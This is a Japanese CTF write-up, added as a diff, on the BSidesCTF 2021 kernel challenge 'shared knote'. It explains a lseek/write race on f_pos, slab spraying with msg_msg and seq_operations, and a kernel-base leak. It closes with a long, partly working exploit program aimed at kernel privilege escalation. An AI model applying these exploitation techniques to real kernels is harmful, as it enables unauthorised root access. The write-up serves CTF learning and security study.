@@ -1,0 +1,715 @@
+
+<p><script src="https://cdn.rawgit.com/google/code-prettify/master/loader/run_prettify.js?skin=desert"></script></p>
+ <!-- KEYWORDS HERE -->
+<div class="contents">[:contents]</div>
+<p> </p>
+<p> </p>
+<p>keywords</p>
+<p>kernel exploit / race / f_pos / seq_operations / zero-addr mapping / VDSO search</p>
+<p></p>
+<h3>1: イントロ</h3>
+<p>いつぞや開催された <strong>BSidesCTF 2021</strong> 。そのkernel問題 <strong>shared knote</strong> 。解けなかったけど少し触ったので途中までの状況を供養しとく。だって触ったのに、なんも書かないし解けもしないの、悲しいじゃん？？？？</p>
+<p>なお、公式から既に完全なwriteupが出ている。zer0pts主催のCTF、一瞬で公式writeupがでていてすごい。すごい一方で、早すぎる公式完全writeupはコミュニティwriteupが出るのを妨げる気もしているので、個人的には1日くらいは方針だけちょい出しして、1日後くらいに完全版を出してほしいという気持ちも無きにしもあらず。</p>
+<p>アディスアベバ。</p>
+<p></p>
+<h3>2: static</h3>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">static.sh</div>
+<pre class="prettyprint linenums lang-sh">
+Linux version 5.14.3 (ptr@medium-pwn) (x86_64-buildroot-linux-uclibc-gcc.br_real (Buildroot 2021.08-804-g03034691
+
+
+#!/bin/sh
+timeout --foreground 300 qemu-system-x86_64 \
+        -m 64M -smp 2 -nographic -no-reboot \
+        -kernel bzImage \
+        -initrd rootfs.cpio \
+        -append &quot;console=ttyS0 loglevel=3 oops=panic panic=-1 pti=on kaslr&quot; \
+        -cpu kvm64 -monitor /dev/null \
+        -net nic,model=virtio -net user
+        
+static struct file_operations module_fops =
+  {
+   .owner   = THIS_MODULE,
+   .llseek  = module_llseek,
+   .read    = module_read,
+   .write   = module_write,
+   .open    = module_open,
+   .release = module_close,
+  };
+</pre>
+<p></p>
+<p>一般的なキャラクタデバイスドライバが実装されている。ドライバ全体で一つのノートを共有する感じになっている。ノートはrefcntで管理されており、open/closeで増減される。</p>
+<p></p>
+<p></p>
+<h3>3: 怪しいと思ったとこ</h3>
+<p>ココ(critical regionがとられてない)と、</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">module_open.c</div>
+<pre class="prettyprint linenums lang-c">
+static int module_open(struct inode *inode, struct file *file)
+{
+  unsigned long old = __atomic_fetch_add(&amp;sknote.refcnt, 1, __ATOMIC_SEQ_CST);
+  if (old == 0) {
+
+    /* First one to open the note */
+    if (!(sknote.noteptr = kzalloc(sizeof(note_t), GFP_KERNEL)))
+      return -ENOMEM;
+    if (!(sknote.noteptr-&gt;data = kzalloc(MAX_NOTE_SIZE, GFP_KERNEL)))
+      return -ENOMEM;
+
+  } else if (old &gt;= 0xff) {
+
+    /* Too many references */
+    __atomic_sub_fetch(&amp;sknote.refcnt, 1, __ATOMIC_SEQ_CST);
+    return -EBUSY;
+
+  }
+
+  return 0;
+}
+</pre>
+<p></p>
+<p>ココ。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">module_write.c</div>
+<pre class="prettyprint linenums lang-c">
+static ssize_t module_write(struct file *file,
+                            const char __user *buf, size_t count,
+                            loff_t *f_pos)
+{
+  note_t *note;
+  ssize_t ecount;
+
+  note = (note_t*)sknote.noteptr;
+
+  // XXX
+  /* Security checks to prevent out-of-bounds write */
+  if (count &lt; 0)
+    return -EINVAL; // Invalid count
+  if (__builtin_saddl_overflow(file-&gt;f_pos, count, &amp;ecount))
+    return -EINVAL; // Too big count
+  if (ecount &gt; MAX_NOTE_SIZE)
+    count = MAX_NOTE_SIZE - file-&gt;f_pos; // Update count
+
+  /* Copy data from user-land */
+  if (copy_from_user(&amp;note-&gt;data[file-&gt;f_pos], buf, count))
+    return -EFAULT; // Invalid user pointer
+
+  /* Update current position and length */
+  *f_pos += count;
+  if (*f_pos &gt; note-&gt;length)
+    note-&gt;length = *f_pos;
+
+  return count;
+}
+</pre>
+<p></p>
+<p>前者は、refcntはロックとられてるのに関数内にcritical regionがとられていないためレースが起きそう。そして、これが実際に想定解だったっぽい。closeは以下のようになっていて、free後はNULLが入る。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">module_close.c</div>
+<pre class="prettyprint linenums lang-c">
+static int module_close(struct inode *inode, struct file *file)
+{
+  // XXX
+  if (__atomic_add_fetch(&amp;sknote.refcnt, -1, __ATOMIC_SEQ_CST) == 0) {
+    /* We can free the note as nobody references it */
+    kfree(sknote.noteptr-&gt;data);
+    kfree(sknote.noteptr);
+    sknote.noteptr = NULL;
+  }
+
+  return 0;
+}
+</pre>
+<p>本番ではNULL入るか〜〜、あちゃ〜〜〜と言ってシカトしていたが、なんか今回のkernelはaddress0にuserlandがマップすることが出来たらしく、NULLをいれる==userlandを指させるということが出来たらしい。前も見たことある気がするけど、いざ本番で見ると、気づかないもんですね。取り敢えず本番はこっちはシカトしました。</p>
+<p></p>
+<p></p>
+<h3>4: vuln: race of lseek/write (invalid f_pos use)</h3>
+<p></p>
+<p>先程のwriteを見ると分かる通り、モジュール内で<code>f_pos</code>と<code>file-&gt;f_pos</code>の両方を使ってしまっている。そもそも、<code>write</code>の呼び出し時には<code>ksys_write()</code>で<code>file-&gt;f_pos</code>をスタックに積んでおり、そのスタックのアドレスを<code>write</code>の第3引数<code>f_pos</code>として渡している。<code>write</code>の呼び出し後にこのスタックの値を確認して、初めて<code>file-&gt;f_pos</code>に下記戻すことになる。そして、モジュール内で<code>file-&gt;f_pos</code>は触ってはいけない(少なくとも僕はこの認識でいる)。唯一の例外が<code>llseek</code>であり、この中では直接<code>file-&gt;f_pos</code>をいじることができる。</p>
+<p></p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">read_write.c</div>
+<pre class="prettyprint linenums lang-c">
+ssize_t ksys_write(unsigned int fd, const char __user *buf, size_t count)
+{
+	struct fd f = fdget_pos(fd);
+	ssize_t ret = -EBADF;
+
+	if (f.file) {
+		loff_t pos, *ppos = file_ppos(f.file);
+		if (ppos) {
+			pos = *ppos;
+			ppos = &amp;pos;
+		}
+		ret = vfs_write(f.file, buf, count, ppos);
+		if (ret &gt;= 0 &amp;&amp; ppos)
+			f.file-&gt;f_pos = pos;
+		fdput_pos(f);
+	}
+
+	return ret;
+}
+</pre>
+<p></p>
+<p></p>
+<p>さて、先程のwriteを見ると、前半で<code>file-&gt;f_pos</code>を、後半で<code>f_pos</code>を使っている。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">module_write.c</div>
+<pre class="prettyprint linenums lang-c">
+  note = (note_t*)sknote.noteptr;
+
+  // XXX
+  /* Security checks to prevent out-of-bounds write */
+  if (count &lt; 0)
+    return -EINVAL; // Invalid count
+  if (__builtin_saddl_overflow(file-&gt;f_pos, count, &amp;ecount))
+    return -EINVAL; // Too big count
+  if (ecount &gt; MAX_NOTE_SIZE)
+    count = MAX_NOTE_SIZE - file-&gt;f_pos; // Update count
+
+  /* Copy data from user-land */
+  if (copy_from_user(&amp;note-&gt;data[file-&gt;f_pos], buf, count)) // XXX writeで止めてる時にcloseしたらどうなる??
+    return -EFAULT; // Invalid user pointer
+
+  /* Update current position and length */
+  *f_pos += count;
+  if (*f_pos &gt; note-&gt;length)
+    note-&gt;length = *f_pos;
+</pre>
+<p></p>
+<p>ここで、以下のようにすることでraceを起こして<code>note-&gt;length</code>を<code>MAX_NOTE_SIZE</code>よりも任意に大きくすることが出来る。</p>
+<p></p>
+<p>Thread A:</p>
+<p>- llseek(0, END)</p>
+<p>- write(MAX_NOTE_SIZE)</p>
+<p></p>
+<p>Thread B:</p>
+<p>- llseek(0, CUR)</p>
+<p></p>
+<p>上手いこと<code>llseek(END, 0) -&gt; write呼び出し -&gt; llseek(SET, 0) -&gt; write前半のチェック</code>という流れになれば、<code>write</code>の第3引数を<code>MAX_NOTE_SIZE</code>にしたまま<code>write</code>の諸々のチェックをパスしてノートサイズを増やすことが出来る。</p>
+<p></p>
+<p>これでOOB(read)の完成。</p>
+<p></p>
+<p></p>
+<h3>5: kbase leak</h3>
+<p></p>
+<p>ノートサイズは0x400であり、あんま良い感じの構造体はただでは隣接しなさそう。ということで、<code>seq_operations</code>が入る0x20スラブと0x400スラブを大量に確保して枯渇させ、新たにページを確保させて隣接させる。</p>
+<p></p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">spray.c</div>
+<pre class="prettyprint linenums lang-c">
+  // heap spray
+  puts(&quot;[.] heap spraying...&quot;);
+  for (int jx = 0; jx != 0x100; ++jx) {
+    int qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
+    if (qid == -1)
+    {
+      errExit(&quot;msgget&quot;);
+    }
+    struct _msgbuf400 msgbuf = {.mtype = 1};
+    memset(msgbuf.mtext, &#x27;A&#x27;, 0x400);
+    KMALLOC(qid, msgbuf, 0x10);
+  }
+  puts(&quot;[.] END heap spraying&quot;);
+
+  // init
+  if ((fd = open(DEV_PATH, O_RDWR)) &lt; 0)
+  {
+    errExit(&quot;open&quot;);
+  }
+  puts(&quot;[.] opened dev file.&quot;);
+
+  // alloc seq_operations next to NOTE
+  puts(&quot;[.] seq spraying...&quot;);
+  #define SEQSIZE 0x300
+  int seq_fds[SEQSIZE];
+  for (int ix = 0; ix != SEQSIZE; ++ix)
+  {
+    if((seq_fds[ix] = open(&quot;/proc/self/stat&quot;, O_RDONLY)) == -1) {
+      errExit(&quot;open seq&quot;);
+    }
+  }
+  puts(&quot;[.] END seq spraying...&quot;);
+</pre>
+<p></p>
+<p>これで、先程のOOB(read)をすると、厳密には完全に隣接こそシていないものの<code>seq_operations</code>のスラブを探し出すことができ、kbaseがleakできる。</p>
+<p></p>
+<h3>6: OOB write</h3>
+<p></p>
+<p>RIPを取るために<code>seq_operations</code>を書き換えたい。すんなり行くかと思えば、<code>write</code>内の以下のせいでめっちゃめんどくさくなった。</p>
+<p></p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">mendoi.c</div>
+<pre class="prettyprint linenums lang-c">
+  if (__builtin_saddl_overflow(file-&gt;f_pos, count, &amp;ecount))
+    return -EINVAL; // Too big count
+  if (ecount &gt; MAX_NOTE_SIZE)
+    count = MAX_NOTE_SIZE - file-&gt;f_pos; // Update count
+</pre>
+<p></p>
+<p>これのせいで、<code>f_pos</code>が大きいとcountがhogeる。よってこれを回避するためにまたraceをした。このチェックだけパスするように<code>llseek</code>を噛ませたが、<code>read</code>のraceが秒で終わったのに対し、こちらは10秒待っても終わるときと終わらないときがあって、しかも書き換えたあとの値が意味分からん値になっていた。</p>
+<p></p>
+<p>詰みました。</p>
+<p></p>
+<p></p>
+<h3>7: 戦いの果て</h3>
+<p></p>
+<p>一応この後も考えたけど、SMEP/SMAPなしならshellcodeいれて終わりじゃ〜んと思ってうきうきでいたら、KPTI有効なのを忘れていた。ROPすればなんとかなってたのかなぁと思いつつも、OOB(write)がうまく言っていなかったこともあり、ここで断念した。</p>
+<p></p>
+<p></p>
+<p></p>
+<h3>8: 想定解</h3>
+<p></p>
+<p>上に述べた、freeの際にNULLをいれるのだが、今回のkernelは0アドレスにuserlandが<code>mmap</code>できる設定だったらしく、NULLを入れる==userlandを指させるという意味に出来たらしい。SMAP無効だし。</p>
+<p>これで簡単にポインタを書き換えてAAW/AAR。KASLR-bypassのためにめっちゃ探索してVDSOを探す。この探索は、<code>copy_from_user</code>がメモリチェックで不正を検出した場合はクラッシュとかではなく単純にエラーを返してくれるので出来ること。偉い。あとは単純に<code>modprobe_path</code>。</p>
+<p>偉いね。</p>
+<p></p>
+<p></p>
+<p></p>
+<h3>9: exploit (to kbase leak + insufficient write)</h3>
+<p></p>
+<p>一応貼っておこ。後で完全版出すかも知れないし、公式のが完全なので出さないかも知れない。</p>
+<p></p>
+<p></p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">exploit.c</div>
+<pre class="prettyprint linenums lang-c">
+#define _GNU_SOURCE
+#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;assert.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;poll.h&gt;
+#include &lt;pthread.h&gt;
+#include &lt;err.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;sched.h&gt;
+#include &lt;linux/bpf.h&gt;
+#include &lt;linux/filter.h&gt;
+#include &lt;linux/userfaultfd.h&gt;
+#include &lt;linux/prctl.h&gt;
+#include &lt;sys/syscall.h&gt;
+#include &lt;sys/ipc.h&gt;
+#include &lt;sys/msg.h&gt;
+#include &lt;sys/prctl.h&gt;
+#include &lt;sys/ioctl.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/xattr.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;sys/uio.h&gt;
+#include &lt;sys/shm.h&gt;
+
+// commands
+#define DEV_PATH &quot;/dev/sknote&quot; // the path the device is placed
+#define MAX_NOTE_SIZE 0x400
+
+// constants
+#define PAGE 0x1000
+#define FAULT_ADDR 0xdead0000
+#define FAULT_OFFSET PAGE
+#define MMAP_SIZE 4 * PAGE
+#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
+// (END constants)
+
+// utils
+#define WAIT getc(stdin);
+#define ulong unsigned long
+#define scu static const unsigned long
+#define NULL (void *)0
+#define errExit(msg)    \
+  do                    \
+  {                     \
+    perror(msg);        \
+    exit(EXIT_FAILURE); \
+  } while (0)
+#define KMALLOC(qid, msgbuf, N)   \
+  for (int ix = 0; ix != N; ++ix) \
+  {                               \
+    if (msgsnd(qid, &amp;msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) \
+    errExit(&quot;KMALLOC&quot;); \
+  }
+ulong user_cs, user_ss, user_sp, user_rflags;
+struct pt_regs
+{
+  ulong r15;
+  ulong r14;
+  ulong r13;
+  ulong r12;
+  ulong bp;
+  ulong bx;
+  ulong r11;
+  ulong r10;
+  ulong r9;
+  ulong r8;
+  ulong ax;
+  ulong cx;
+  ulong dx;
+  ulong si;
+  ulong di;
+  ulong orig_ax;
+  ulong ip;
+  ulong cs;
+  ulong flags;
+  ulong sp;
+  ulong ss;
+};
+void print_regs(struct pt_regs *regs)
+{
+  printf(&quot;r15: %lx r14: %lx r13: %lx r12: %lx\n&quot;, regs-&gt;r15, regs-&gt;r14, regs-&gt;r13, regs-&gt;r12);
+  printf(&quot;bp: %lx bx: %lx r11: %lx r10: %lx\n&quot;, regs-&gt;bp, regs-&gt;bx, regs-&gt;r11, regs-&gt;r10);
+  printf(&quot;r9: %lx r8: %lx ax: %lx cx: %lx\n&quot;, regs-&gt;r9, regs-&gt;r8, regs-&gt;ax, regs-&gt;cx);
+  printf(&quot;dx: %lx si: %lx di: %lx ip: %lx\n&quot;, regs-&gt;dx, regs-&gt;si, regs-&gt;di, regs-&gt;ip);
+  printf(&quot;cs: %lx flags: %lx sp: %lx ss: %lx\n&quot;, regs-&gt;cs, regs-&gt;flags, regs-&gt;sp, regs-&gt;ss);
+}
+void NIRUGIRI(void)
+{
+  char *argv[] = {&quot;/bin/sh&quot;, NULL};
+  char *envp[] = {NULL};
+  execve(&quot;/bin/sh&quot;, argv, envp);
+}
+// should compile with -masm=intel
+static void save_state(void)
+{
+  asm(
+      &quot;movq %0, %%cs\n&quot;
+      &quot;movq %1, %%ss\n&quot;
+      &quot;movq %2, %%rsp\n&quot;
+      &quot;pushfq\n&quot;
+      &quot;popq %3\n&quot;
+      : &quot;=r&quot;(user_cs), &quot;=r&quot;(user_ss), &quot;=r&quot;(user_sp), &quot;=r&quot;(user_rflags)
+      :
+      : &quot;memory&quot;);
+}
+
+unsigned long (*rooter_pkc)(unsigned long) = 0;
+unsigned long (*rooter_commit_creds)(unsigned long) = 0;
+
+int shellcode_is_called = 0;
+
+static void shellcode(void)
+{
+  //asm(
+  //    &quot;xor rdi, rdi\n&quot;
+  //    &quot;mov rbx, QWORD PTR [rsp+0x50]\n&quot;
+  //    &quot;sub rbx, 0x244566\n&quot;
+  //    &quot;mov rcx, rbx\n&quot;
+  //    &quot;call rcx\n&quot;
+  //    &quot;mov rdi, rax\n&quot;
+  //    &quot;sub rbx, 0x470\n&quot;
+  //    &quot;call rbx\n&quot;
+  //    &quot;add rsp, 0x20\n&quot;
+  //    &quot;pop rbx\n&quot;
+  //    &quot;pop r12\n&quot;
+  //    &quot;pop r13\n&quot;
+  //    &quot;pop r14\n&quot;
+  //    &quot;pop r15\n&quot;
+  //    &quot;pop rbp\n&quot;
+  //    &quot;ret\n&quot;);
+  //save_state();
+
+  //shellcode_is_called = 1;
+  //rooter_commit_creds(rooter_pkc(0));
+}
+// (END utils)
+
+// globals
+const unsigned PSIZE = 10;
+int fd = 0;
+const ulong ADDRBASE = 0x10000;
+int write_permission = 0;
+long target_offset = 0;
+typedef struct
+{
+  int whoami;
+  long uffd;
+} thrinfo;
+char EMPTYNOTE[PAGE];
+// (END globals)
+
+ulong sk_seek_abs(unsigned abs)
+{
+  assert(fd != 0);
+  ulong hoge = lseek(fd, abs, SEEK_SET);
+  if (hoge == -1)
+  {
+    errExit(&quot;lseek&quot;);
+  }
+  return hoge;
+}
+
+void sk_seek_zero(void)
+{
+  sk_seek_abs(0);
+}
+
+ulong sk_seek_end(void)
+{
+  assert(fd != 0);
+  return lseek(fd, 0, SEEK_END);
+}
+
+int SHOULDEND = 0;
+
+#define REPEAT 80
+
+static void *writer(void *arg)
+{
+  //int whoami = *(int*)arg;
+  //printf(&quot;[.] writer inited: %d\n&quot;, whoami);
+
+  assert(fd != 0);
+  ulong cur;
+  char buf[PAGE] = {0};
+  ulong old = MAX_NOTE_SIZE;
+  while (1 == 1)
+  {
+    cur = sk_seek_end();
+    if(cur != old) {
+      printf(&quot;[+] extended to 0x%lx : %lx\n&quot;, cur, cur / MAX_NOTE_SIZE);
+      old = cur;
+    }
+    if (cur &gt; MAX_NOTE_SIZE * REPEAT)
+    {
+      printf(&quot;[SEEK_END] %lx\n&quot;, cur);
+      puts(&quot;!!!!!!!!!!!!!!!!!!!!!!!!!!&quot;);
+      SHOULDEND = 1;
+      return 0;
+    }
+    int ret = write(fd, buf, MAX_NOTE_SIZE);
+  }
+  printf(&quot;[.] writer finished\n&quot;);
+}
+
+static void *zeroer(void *arg)
+{
+  assert(fd != 0);
+  while (SHOULDEND == 0)
+  {
+    sk_seek_zero();
+  }
+  return 0;
+}
+
+static void *targeter(void *arg) {
+  while (SHOULDEND == 0) {
+    sk_seek_abs(target_offset);
+  }
+  printf(&quot;[.] targeter finished\n&quot;);
+}
+
+static void *writer2(void *arg) {
+  ulong cur;
+  ulong value = ((ulong)shellcode) + 4;
+  ulong written_value[4] = {value, value, value, value};
+  ulong old = MAX_NOTE_SIZE;
+  while (SHOULDEND == 0)
+  {
+    sk_seek_zero();
+    int ret = write(fd, written_value, 8 * 4);
+  }
+  printf(&quot;[.] writer2 finished\n&quot;);
+}
+
+void print_curious(char *buf, size_t size)
+{
+  for (int ix = 0; ix != size / 8; ++ix)
+  {
+    long hoge = *((ulong *)buf + ix);
+    if (hoge != 0)
+    {
+      printf(&quot;[+%x] %lx\n&quot;, ix * 8, hoge);
+    }
+  }
+}
+
+unsigned long find_signature(char *buf, size_t size) {
+  unsigned signatures[4] = {0xa0, 0xc0, 0xb0, 0x20};
+  int step = 0;
+  for (int ix = 0; ix != size / 8; ++ix)
+  {
+    long hoge = *((ulong *)buf + ix);
+    if((hoge&amp;0xFF) == signatures[step]) {
+      ++step;
+    } else {
+      step = 0;
+    }
+    if(step == 4) {
+      return (ix - 3) * 8;
+    }
+  }
+  return 0;
+}
+
+struct _msgbuf400
+{
+  long mtype;
+  char mtext[0x400];
+};
+
+int main(int argc, char *argv[])
+{
+  printf(&quot;[.] shellcode @ %p\n&quot;, shellcode);
+  pthread_t writer_thr, zeroer_thr;
+  memset(EMPTYNOTE, &#x27;A&#x27;, MAX_NOTE_SIZE * 2);
+
+  // heap spray
+  puts(&quot;[.] heap spraying...&quot;);
+  for (int jx = 0; jx != 0x100; ++jx) {
+    int qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
+    if (qid == -1)
+    {
+      errExit(&quot;msgget&quot;);
+    }
+    struct _msgbuf400 msgbuf = {.mtype = 1};
+    memset(msgbuf.mtext, &#x27;A&#x27;, 0x400);
+    KMALLOC(qid, msgbuf, 0x10);
+  }
+  puts(&quot;[.] END heap spraying&quot;);
+
+  // init
+  if ((fd = open(DEV_PATH, O_RDWR)) &lt; 0)
+  {
+    errExit(&quot;open&quot;);
+  }
+  puts(&quot;[.] opened dev file.&quot;);
+
+  // alloc seq_operations next to NOTE
+  puts(&quot;[.] seq spraying...&quot;);
+  #define SEQSIZE 0x300
+  int seq_fds[SEQSIZE];
+  for (int ix = 0; ix != SEQSIZE; ++ix)
+  {
+    if((seq_fds[ix] = open(&quot;/proc/self/stat&quot;, O_RDONLY)) == -1) {
+      errExit(&quot;open seq&quot;);
+    }
+  }
+  puts(&quot;[.] END seq spraying...&quot;);
+
+  // first write
+  puts(&quot;[.] first write&quot;);
+  assert(write(fd, EMPTYNOTE, MAX_NOTE_SIZE) != -1);
+
+  // init threads
+  puts(&quot;[.] writer thread initing...&quot;);
+  assert(pthread_create(&amp;writer_thr, NULL, writer, (void *)0) == 0);
+  puts(&quot;[.] zeroer thread initing...&quot;);
+  assert(pthread_create(&amp;zeroer_thr, NULL, zeroer, (void *)0) == 0);
+
+  pthread_join(writer_thr, NULL);
+
+  // leek
+  sleep(1);
+  char buf[REPEAT * PAGE] = {0};
+  sk_seek_zero();
+  if (read(fd, buf, REPEAT * MAX_NOTE_SIZE) == -1)
+  {
+    errExit(&quot;read&quot;);
+  }
+
+  //print_curious(buf, REPEAT * MAX_NOTE_SIZE);
+  target_offset = find_signature(buf, REPEAT * MAX_NOTE_SIZE);
+  if (target_offset == 0) {
+    errExit(&quot;target not found...&quot;);
+  }
+  printf(&quot;[!] target found @ offset 0x%lx\n&quot;, target_offset);
+  print_curious(buf + target_offset, 8 * 8);
+
+  ulong single_start = *(ulong *)(buf + target_offset);
+  ulong kernbase = single_start - 0x16e1a0;
+  ulong pkc = (0xffffffff810709f0 - 0xffffffff81000000) + kernbase;
+  ulong commit_creds = (0xffffffff81070860 - 0xffffffff81000000) + kernbase;
+  printf(&quot;[!] single_start: 0x%lx\n&quot;, single_start);
+  printf(&quot;[!] kernbase: 0x%lx\n&quot;, kernbase);
+  printf(&quot;[!] pkc: 0x%lx\n&quot;, pkc);
+  printf(&quot;[!] commit_creds: 0x%lx\n&quot;, commit_creds);
+
+  rooter_pkc = pkc;
+  rooter_commit_creds = commit_creds;
+
+  // overwrite
+  printf(&quot;[+] overwrite as %lx\n&quot;, shellcode);
+  ulong value = (ulong)shellcode;
+  SHOULDEND = 0;
+
+  puts(&quot;[.] writer thread initing...&quot;);
+  assert(pthread_create(&amp;writer_thr, NULL, writer2, (void *)0) == 0);
+  puts(&quot;[.] targeter thread initing...&quot;);
+  assert(pthread_create(&amp;zeroer_thr, NULL, targeter, (void *)0) == 0);
+  puts(&quot;[...] waiting lack...&quot;);
+  sleep(3);
+  SHOULDEND = 1;
+
+  sk_seek_abs(target_offset);
+  long nowvictim = 0;
+  assert(read(fd, &amp;nowvictim, 8) != -1);
+  if(nowvictim == single_start) {
+    printf(&quot;[-] failed to overwrite...\n&quot;);
+    errExit(0);
+  } else {
+    printf(&quot;[!!] overwrite success!! : 0x%lx\n&quot;, nowvictim);
+  }
+
+  //print_curious(buf, MAX_NOTE_SIZE * REPEAT);
+
+
+  //ulong cur = sk_seek_abs(target_offset);
+  //printf(&quot;[+] cur: %lx\n&quot;, cur);
+  //for (int ix = 0; ix != 4; ++ix)
+  //{
+  //  if(write(fd, &amp;value, 8) == -1) {
+  //    puts(&quot;fail&quot;);
+  //    WAIT;
+  //    errExit(&quot;write&quot;);
+  //  }
+  //}
+
+  // invoke shellcode
+  puts(&quot;[.] reading seqs&quot;);
+  char hoge[0x10];
+  for (int ix = 0; ix != SEQSIZE; ++ix)
+  {
+    if(read(seq_fds[ix], hoge, 1) == -1) {
+      errExit(&quot;seq read&quot;);
+    }
+  }
+
+  if(shellcode_is_called == 0) {
+    errExit(&quot;shellcode is not called&quot;);
+  }
+
+  puts(&quot;[+] executing NIRUGIRI...&quot;);
+  NIRUGIRI();
+
+  // end of life
+  puts(&quot;[ ] END exploit.&quot;);
+
+  return 0;
+}
+</pre>
+<p></p>
+<p></p>
+<h3>10: アウトロ</h3>
+<p></p>
+<p>犬飼いたいんですが、大学生で犬買うの、金銭面的にと言うか、時間的にきつそうですよね。。。</p>
+<p></p>
+<p></p>
+<p></p>
+<h3>11: 参考</h3>
+<p>1: 公式writeup</p>
+<p><a href='https://hackmd.io/@ptr-yudai/BkO-gQEDt'>https://hackmd.io/@ptr-yudai/BkO-gQEDt</a></p>
+<p>2: ニルギリ</p>
+<p><a href='https://youtu.be/yvUvamhYPHw'>https://youtu.be/yvUvamhYPHw</a></p>
+<p>3: </p>
+<p><a href=''></a></p>
+
+<p></p><p></p>
+<p></p><p></p>
+<p>続く...</p>
+<p></p><p></p>
